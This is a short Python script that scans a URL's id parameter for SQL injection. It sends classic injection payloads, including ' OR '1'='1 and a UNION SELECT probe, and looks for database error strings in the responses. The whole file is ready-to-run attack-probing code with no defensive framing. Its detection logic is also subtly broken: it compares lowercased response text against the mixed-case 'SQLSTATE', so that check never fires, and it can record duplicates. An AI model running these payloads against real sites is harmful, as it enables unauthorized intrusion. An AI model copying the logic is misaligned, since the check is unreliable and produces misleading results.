import requests

payloads = [
"'",
"' OR '1'='1",
"' UNION SELECT NULL--"
]

errors = [
"sql syntax",
"mysql_fetch",
"SQLSTATE",
"syntax error"
]

def scan_sqli(url):

    vulns = []

    for p in payloads:

        test = url + "?id=" + p

        try:

            r = requests.get(test)

            for e in errors:

                if e in r.text.lower():
                    vulns.append(test)

        except:
            pass

    return vulns